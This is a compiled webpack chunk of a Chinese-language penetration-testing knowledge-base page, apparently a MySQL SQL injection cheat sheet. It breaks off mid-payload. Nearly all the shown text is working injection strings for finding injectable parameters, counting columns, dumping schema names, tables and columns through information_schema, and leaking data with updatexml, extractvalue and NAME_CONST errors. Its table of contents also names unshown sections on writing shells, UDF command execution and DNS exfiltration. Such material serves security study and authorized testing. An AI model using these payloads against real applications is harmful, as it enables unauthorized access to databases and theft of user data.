"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[6591],{159:(e,n,c)=>{c.r(n),c.d(n,{assets:()=>i,contentTitle:()=>d,default:()=>h,frontMatter:()=>r,metadata:()=>s,toc:()=>t});const s=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MySQL","title":"MySQL","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/04.MySQL.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MySQL","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MySQL","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/04.MySQL.md","tags":[],"version":"current","sidebarPosition":4,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Oracle","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/Oracle"},"next":{"title":"PostgreSQL","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL"}}');var l=c(4848),a=c(8453);const r={},d=void 0,i={},t=[{value:"MYSQL \u9ed8\u8ba4\u6570\u636e\u5e93",id:"mysql-\u9ed8\u8ba4\u6570\u636e\u5e93",level:2},{value:"MYSQL \u6ce8\u91ca",id:"mysql-\u6ce8\u91ca",level:2},{value:"MYSQL \u6d4b\u8bd5\u6ce8\u5165",id:"mysql-\u6d4b\u8bd5\u6ce8\u5165",level:2},{value:"\u57fa\u4e8e MYSQL \u8054\u5408",id:"\u57fa\u4e8e-mysql-\u8054\u5408",level:2},{value:"\u68c0\u6d4b\u5217\u6570",id:"\u68c0\u6d4b\u5217\u6570",level:3},{value:"\u4f7f\u7528 <code>order by</code> \u6216",id:"\u4f7f\u7528-order-by-\u6216",level:5},{value:"\u4f7f\u7528 <code>order by</code> \u6216\u57fa\u4e8e\u9519\u8bef",id:"\u4f7f\u7528-order-by-\u6216\u57fa\u4e8e\u9519\u8bef",level:5},{value:"\u4f7f\u7528 <code>UNION SELECT</code> \u57fa\u4e8e\u9519\u8bef",id:"\u4f7f\u7528-union-select-\u57fa\u4e8e\u9519\u8bef",level:5},{value:"\u4f7f\u7528 <code>LIMIT INTO</code> \u57fa\u4e8e\u9519\u8bef",id:"\u4f7f\u7528-limit-into-\u57fa\u4e8e\u9519\u8bef",level:5},{value:"\u4f7f\u7528 <code>SELECT * FROM SOME_EXISTING_TABLE</code> \u57fa\u4e8e\u9519\u8bef",id:"\u4f7f\u7528-select--from-some_existing_table-\u57fa\u4e8e\u9519\u8bef",level:5},{value:"\u4f7f\u7528\u4fe1\u606f\u63d0\u53d6\u6570\u636e\u5e93 _schema",id:"\u4f7f\u7528\u4fe1\u606f\u63d0\u53d6\u6570\u636e\u5e93-_schema",level:3},{value:"\u63d0\u53d6\u4e0d\u5305\u542b\u4fe1\u606f\u7684\u5217\u540d _schema",id:"\u63d0\u53d6\u4e0d\u5305\u542b\u4fe1\u606f\u7684\u5217\u540d-_schema",level:3},{value:"\u63d0\u53d6\u4e0d\u5e26\u5217\u540d\u7684\u6570\u636e",id:"\u63d0\u53d6\u4e0d\u5e26\u5217\u540d\u7684\u6570\u636e",level:3},{value:"\u57fa\u4e8e MYSQL \u9519\u8bef",id:"\u57fa\u4e8e-mysql-\u9519\u8bef",level:2},{value:"\u57fa\u4e8e MYSQL \u9519\u8bef-\u57fa\u672c",id:"\u57fa\u4e8e-mysql-\u9519\u8bef-\u57fa\u672c",level:3},{value:"\u57fa\u4e8e MYSQL \u9519\u8bef\u7684-UpdateXML \u51fd\u6570",id:"\u57fa\u4e8e-mysql-\u9519\u8bef\u7684-updatexml-\u51fd\u6570",level:3},{value:"MYSQL \u57fa\u4e8e\u9519\u8bef-\u63d0\u53d6\u503c\u51fd\u6570",id:"mysql-\u57fa\u4e8e\u9519\u8bef-\u63d0\u53d6\u503c\u51fd\u6570",level:3},{value:"\u57fa\u4e8e MYSQL \u9519\u8bef\u7684-NAME_CONST \u51fd\u6570\uff08\u4ec5\u9002\u7528\u4e8e\u5e38\u91cf\uff09",id:"\u57fa\u4e8e-mysql-\u9519\u8bef\u7684-name_const-\u51fd\u6570\u4ec5\u9002\u7528\u4e8e\u5e38\u91cf",level:3},{value:"MYSQL \u76f2",id:"mysql-\u76f2",level:2},{value:"\u5177\u6709\u7b49\u6548\u5b50\u5b57\u7b26\u4e32\u7684 MYSQL \u76f2",id:"\u5177\u6709\u7b49\u6548\u5b50\u5b57\u7b26\u4e32\u7684-mysql-\u76f2",level:3},{value:"\u4f7f\u7528\u4e8c\u8fdb\u5236\u67e5\u8be2\u548c REGEXP \u5728 ORDER BY \u5b50\u53e5\u4e2d\u8fdb\u884c MySQL \u76f2 SQL \u6ce8\u5165",id:"\u4f7f\u7528\u4e8c\u8fdb\u5236\u67e5\u8be2\u548c-regexp-\u5728-order-by-\u5b50\u53e5\u4e2d\u8fdb\u884c-mysql-\u76f2-sql-\u6ce8\u5165",level:3},{value:"MySQL \u76f2 SQL \u6ce8\u5165\u4e8c\u8fdb\u5236\u67e5\u8be2\u4f7f\u7528 REGEXP\u3002",id:"mysql-\u76f2-sql-\u6ce8\u5165\u4e8c\u8fdb\u5236\u67e5\u8be2\u4f7f\u7528-regexp",level:3},{value:"\u4f7f\u7528\u6761\u4ef6\u8bed\u53e5\u7684 MYSQL \u76f2",id:"\u4f7f\u7528\u6761\u4ef6\u8bed\u53e5\u7684-mysql-\u76f2",level:3},{value:"\u5e26 MAKE_SET \u7684 MYSQL \u76f2",id:"\u5e26-make_set-\u7684-mysql-\u76f2",level:3},{value:"\u5e26 LIKE \u7684 MYSQL \u76f2",id:"\u5e26-like-\u7684-mysql-\u76f2",level:3},{value:"MYSQL \u57fa\u4e8e\u65f6\u95f4",id:"mysql-\u57fa\u4e8e\u65f6\u95f4",level:2},{value:"\u5728\u5b50\u9009\u62e9\u4e2d\u4f7f\u7528 SLEEP",id:"\u5728\u5b50\u9009\u62e9\u4e2d\u4f7f\u7528-sleep",level:3},{value:"\u4f7f\u7528\u6761\u4ef6\u8bed\u53e5",id:"\u4f7f\u7528\u6761\u4ef6\u8bed\u53e5",level:3},{value:"MYSQL DIOS-\u4e00\u6b21\u6027\u8f6c\u50a8",id:"mysql-dios-\u4e00\u6b21\u6027\u8f6c\u50a8",level:2},{value:"MYSQL \u5f53\u524d\u67e5\u8be2",id:"mysql-\u5f53\u524d\u67e5\u8be2",level:2},{value:"MYSQL \u8bfb\u53d6\u6587\u4ef6\u7684\u5185\u5bb9",id:"mysql-\u8bfb\u53d6\u6587\u4ef6\u7684\u5185\u5bb9",level:2},{value:"MYSQL \u7f16\u5199\u4e00\u4e2a shell",id:"mysql-\u7f16\u5199\u4e00\u4e2a-shell",level:2},{value:"\u8fdb\u5165\u5916\u573a\u6cd5",id:"\u8fdb\u5165\u5916\u573a\u6cd5",level:3},{value:"\u5199\u5165\u6587\u4ef6\u65b9\u6cd5",id:"\u5199\u5165\u6587\u4ef6\u65b9\u6cd5",level:3},{value:"MYSQL \u622a\u65ad",id:"mysql-\u622a\u65ad",level:2},{value:"MYSQL \u5feb\u901f\u5229\u7528",id:"mysql-\u5feb\u901f\u5229\u7528",level:2},{value:"MYSQL UDF \u547d\u4ee4\u6267\u884c",id:"mysql-udf-\u547d\u4ee4\u6267\u884c",level:2},{value:"MYSQL \u5e26\u5916",id:"mysql-\u5e26\u5916",level:2},{value:"DNS \u5916\u8fc7\u6ee4",id:"dns-\u5916\u8fc7\u6ee4",level:3},{value:"UNC \u8def\u5f84-NTLM \u54c8\u5e0c\u7a83\u53d6",id:"unc-\u8def\u5f84-ntlm-\u54c8\u5e0c\u7a83\u53d6",level:3},{value:"\u53c2\u8003\u6587\u732e",id:"\u53c2\u8003\u6587\u732e",level:2}];function o(e){const n={a:"a",code:"code",h2:"h2",h3:"h3",h5:"h5",img:"img",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,a.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,l.jsx)(n.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,l.jsx)(n.tbody,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{style:{textAlign:"left"},children:(0,l.jsx)(n.img,{src:"https://img.shields.io/badge/wjlin0-blog-green",alt:"wjlin0"})}),(0,l.jsx)(n.td,{style:{textAlign:"left"},children:"2023-07-05 21:37:29"})]})})]}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u9ed8\u8ba4\u6570\u636e\u5e93",children:"MYSQL \u9ed8\u8ba4\u6570\u636e\u5e93"}),"\n",(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{children:"Name"}),(0,l.jsx)(n.th,{children:"\u63cf\u8ff0"})]})}),(0,l.jsxs)(n.tbody,{children:[(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"mysql"}),(0,l.jsx)(n.td,{children:"\u9700\u8981 root \u6743\u9650"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"information_schema"}),(0,l.jsx)(n.td,{children:"Availalble \u7248\u672c 5 \u53ca\u66f4\u9ad8\u7248\u672c"})]})]})]}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u6ce8\u91ca",children:"MYSQL \u6ce8\u91ca"}),"\n",(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{children:"Type"}),(0,l.jsx)(n.th,{children:"\u63cf\u8ff0"})]})}),(0,l.jsxs)(n.tbody,{children:[(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:(0,l.jsx)(n.code,{children:"#"})}),(0,l.jsx)(n.td,{children:"\u54c8\u5e0c\u6ce8\u91ca"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:(0,l.jsx)(n.code,{children:"/* MYSQL Comment */"})}),(0,l.jsx)(n.td,{children:"C \u6837\u5f0f\u6ce8\u91ca"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:(0,l.jsx)(n.code,{children:"/*! MYSQL Special SQL */"})}),(0,l.jsx)(n.td,{children:"\u7279\u6b8a SQL"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:(0,l.jsx)(n.code,{children:"/*!32302 10*/"})}),(0,l.jsx)(n.td,{children:"MYSQL 3.23.02 \u7248\u672c\u6ce8\u91ca"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:(0,l.jsx)(n.code,{children:"-- -"})}),(0,l.jsx)(n.td,{children:"SQL \u6ce8\u91ca"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:(0,l.jsx)(n.code,{children:";%00"})}),(0,l.jsx)(n.td,{children:"\u65e0\u5b57\u8282"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"`"}),(0,l.jsx)(n.td,{children:"\u91cd\u97f3\u7b26"})]})]})]}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u6d4b\u8bd5\u6ce8\u5165",children:"MYSQL \u6d4b\u8bd5\u6ce8\u5165"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:["\uff1a\u67e5\u8be2\u4e3a ",(0,l.jsx)(n.code,{children:"SELECT * FROM Table WHERE id = 'FUZZ';"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"'\tFalse\n''\tTrue\n\"\tFalse\n\"\"\tTrue\n\\\tFalse\n\\\\\tTrue\n"})}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:["\uff1a\u67e5\u8be2\u4e3a ",(0,l.jsx)(n.code,{children:"SELECT * FROM Table WHERE id = FUZZ;"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"AND 1\t    True\nAND 0\t    False\nAND true\tTrue\nAND false\tFalse\n1-false\t    Returns 1 if vulnerable\n1-true\t    Returns 0 if vulnerable\n1*56\t    Returns 56 if vulnerable\n1*56\t    Returns 1 if not vulnerable\n"})}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:["\uff1a\u67e5\u8be2\u4e3a ",(0,l.jsx)(n.code,{children:"SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"' OR '1\n' OR 1 -- -\n\" OR \"\" = \"\n\" OR 1 = 1 -- -\n'='\n'LIKE'\n'=0--+\n"})}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"\u57fa\u4e8e-mysql-\u8054\u5408",children:"\u57fa\u4e8e MYSQL \u8054\u5408"}),"\n",(0,l.jsx)(n.h3,{id:"\u68c0\u6d4b\u5217\u6570",children:"\u68c0\u6d4b\u5217\u6570"}),"\n",(0,l.jsx)(n.p,{children:"\u9996\u5148\u60a8\u9700\u8981\u77e5\u9053\u5217\u7684\u6570\u91cf"}),"\n",(0,l.jsxs)(n.h5,{id:"\u4f7f\u7528-order-by-\u6216",children:["\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"order by"})," \u6216"]}),"\n",(0,l.jsx)(n.p,{children:"\u4e0d\u65ad\u589e\u52a0\u8fd9\u4e2a\u6570\u5b57\uff0c\u76f4\u5230\u60a8\u5f97\u5230\u4e00\u4e2a\u9519\u8bef\u7684\u56de\u7b54\u3002\u5c3d\u7ba1 GROUP BY \u548c ORDER BY \u5728 SQL \u4e2d\u5177\u6709\u4e0d\u540c\u7684\u529f\u80fd\u6027\uff0c\u4f46\u5b83\u4eec\u90fd\u53ef\u4ee5\u4ee5\u5b8c\u5168\u76f8\u540c\u7684\u65b9\u5f0f\u7528\u4e8e\u786e\u5b9a\u67e5\u8be2\u4e2d\u7684\u5217\u6570\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"1' ORDER BY 1--+\t#True\n1' ORDER BY 2--+\t#True\n1' ORDER BY 3--+\t#True\n1' ORDER BY 4--+\t#False - Query is only using 3 columns\n                        #-1' UNION SELECT 1,2,3--+\tTrue\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u6216"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"1' GROUP BY 1--+\t#True\n1' GROUP BY 2--+\t#True\n1' GROUP BY 3--+\t#True\n1' GROUP BY 4--+\t#False - Query is only using 3 columns\n                        #-1' UNION SELECT 1,2,3--+\tTrue\n"})}),"\n",(0,l.jsxs)(n.h5,{id:"\u4f7f\u7528-order-by-\u6216\u57fa\u4e8e\u9519\u8bef",children:["\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"order by"})," \u6216\u57fa\u4e8e\u9519\u8bef"]}),"\n",(0,l.jsx)(n.p,{children:"\u4e0e\u524d\u9762\u7684\u65b9\u6cd5\u7c7b\u4f3c\uff0c\u5982\u679c\u542f\u7528\u4e86\u9519\u8bef\u663e\u793a\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 1 \u4e2a\u8bf7\u6c42\u68c0\u67e5\u5217\u6570\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+\n\n# Unknown column '4' in 'order clause'\n# This error means query uses 3 column\n#-1' UNION SELECT 1,2,3--+\tTrue\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u6216"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+\n\n# Unknown column '4' in 'group statement'\n# This error means query uses 3 column\n#-1' UNION SELECT 1,2,3--+\tTrue\n"})}),"\n",(0,l.jsxs)(n.h5,{id:"\u4f7f\u7528-union-select-\u57fa\u4e8e\u9519\u8bef",children:["\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"UNION SELECT"})," \u57fa\u4e8e\u9519\u8bef"]}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u679c\u542f\u7528\u4e86\u9519\u8bef\u663e\u793a\uff0c\u5219\u6b64\u65b9\u6cd5\u6709\u6548"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"1' UNION SELECT @--+        #The used SELECT statements have a different number of columns\n1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns\n1' UNION SELECT @,@,@--+    #No error means query uses 3 column\n                            #-1' UNION SELECT 1,2,3--+\tTrue\n"})}),"\n",(0,l.jsxs)(n.h5,{id:"\u4f7f\u7528-limit-into-\u57fa\u4e8e\u9519\u8bef",children:["\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"LIMIT INTO"})," \u57fa\u4e8e\u9519\u8bef"]}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u679c\u542f\u7528\u4e86\u9519\u8bef\u663e\u793a\uff0c\u5219\u6b64\u65b9\u6cd5\u6709\u6548\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u5f53\u6ce8\u5165\u70b9\u4f4d\u4e8e LIMIT \u5b50\u53e5\u4e4b\u540e\u65f6\uff0c\u8fd9\u5bf9\u4e8e\u67e5\u627e\u5217\u6570\u975e\u5e38\u6709\u7528\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns\n1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns\n1' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column\n                              #-1' UNION SELECT 1,2,3--+\tTrue\n"})}),"\n",(0,l.jsxs)(n.h5,{id:"\u4f7f\u7528-select--from-some_existing_table-\u57fa\u4e8e\u9519\u8bef",children:["\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"SELECT * FROM SOME_EXISTING_TABLE"})," \u57fa\u4e8e\u9519\u8bef"]}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u679c\u60a8\u77e5\u9053\u8981\u67e5\u627e\u7684\u8868\u540d\u5e76\u4e14\u542f\u7528\u4e86\u9519\u8bef\u663e\u793a\uff0c\u5219\u6b64\u64cd\u4f5c\u6709\u6548\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u5b83\u5c06\u8fd4\u56de\u8868\u4e2d\u7684\u5217\u6570\uff0c\u800c\u4e0d\u662f\u67e5\u8be2\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"1' AND (SELECT * FROM Users) = 1--+ \t#Operand should contain 3 column(s)\n                                        # This error means query uses 3 column\n                                        #-1' UNION SELECT 1,2,3--+\tTrue\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u4f7f\u7528\u4fe1\u606f\u63d0\u53d6\u6570\u636e\u5e93-_schema",children:"\u4f7f\u7528\u4fe1\u606f\u63d0\u53d6\u6570\u636e\u5e93 _schema"}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\uff0c\u4ee5\u4e0b\u4ee3\u7801\u5c06\u63d0\u53d6\u6570\u636e\u5e93\u7684\u540d\u79f0\u3001\u8868\u7684\u540d\u79f0\u3001\u5217\u7684\u540d\u79f0\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u63d0\u53d6\u4e0d\u5305\u542b\u4fe1\u606f\u7684\u5217\u540d-_schema",children:"\u63d0\u53d6\u4e0d\u5305\u542b\u4fe1\u606f\u7684\u5217\u540d _schema"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"MySQL >= 4.1"})," \u7684\u65b9\u6cd5\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u9996\u5148\u7528\u63d0\u53d6\u5217\u7f16\u53f7"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"?id=(1)and(SELECT * from db.users)=(1)\n-- Operand should contain 4 column(s)\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u63d0\u53d6\u5217\u540d\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)\n--Column 'id' cannot be null\n"})}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"MySQL 5"})," \u7684\u65b9\u6cd5"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a\n--#1060 - Duplicate column name 'id'\n\n-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a\n-- #1060 - Duplicate column name 'name'\n\n-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a\n...\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u63d0\u53d6\u4e0d\u5e26\u5217\u540d\u7684\u6570\u636e",children:"\u63d0\u53d6\u4e0d\u5e26\u5217\u540d\u7684\u6570\u636e"}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u4e0d\u77e5\u9053\u7b2c 4 \u5217\u540d\u79f0\u7684\u60c5\u51b5\u4e0b\u63d0\u53d6\u6570\u636e\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u67e5\u8be2\u5185\u90e8\u7684\u6ce8\u5165\u793a\u4f8b ",(0,l.jsx)(n.code,{children:"select author_id,title from posts where author_id=[INJECT_HERE]"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);\n+-----------+-----------------------------------------------------------------+\n| author_id | title                                                           |\n+-----------+-----------------------------------------------------------------+\n|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |\n+-----------+-----------------------------------------------------------------+\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\u57fa\u4e8e-mysql-\u9519\u8bef",children:"\u57fa\u4e8e MYSQL \u9519\u8bef"}),"\n",(0,l.jsx)(n.h3,{id:"\u57fa\u4e8e-mysql-\u9519\u8bef-\u57fa\u672c",children:"\u57fa\u4e8e MYSQL \u9519\u8bef-\u57fa\u672c"}),"\n",(0,l.jsxs)(n.p,{children:["\u9002\u7528\u4e8e ",(0,l.jsx)(n.code,{children:"MySQL >= 4.1"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))\n'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u57fa\u4e8e-mysql-\u9519\u8bef\u7684-updatexml-\u51fd\u6570",children:"\u57fa\u4e8e MYSQL \u9519\u8bef\u7684-UpdateXML \u51fd\u6570"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u9605\u8bfb\u65f6\u95f4\u66f4\u77ed\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"' and updatexml(null,concat(0x0a,version()),null)-- -\n' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -\n"})}),"\n",(0,l.jsx)(n.h3,{id:"mysql-\u57fa\u4e8e\u9519\u8bef-\u63d0\u53d6\u503c\u51fd\u6570",children:"MYSQL \u57fa\u4e8e\u9519\u8bef-\u63d0\u53d6\u503c\u51fd\u6570"}),"\n",(0,l.jsxs)(n.p,{children:["\u9002\u7528\u4e8e ",(0,l.jsx)(n.code,{children:"MySQL >= 5.1"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u57fa\u4e8e-mysql-\u9519\u8bef\u7684-name_const-\u51fd\u6570\u4ec5\u9002\u7528\u4e8e\u5e38\u91cf",children:"\u57fa\u4e8e MYSQL \u9519\u8bef\u7684-NAME_CONST \u51fd\u6570\uff08\u4ec5\u9002\u7528\u4e8e\u5e38\u91cf\uff09"}),"\n",(0,l.jsxs)(n.p,{children:["\u9002\u7528\u4e8e ",(0,l.jsx)(n.code,{children:"MySQL >= 5.0"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as 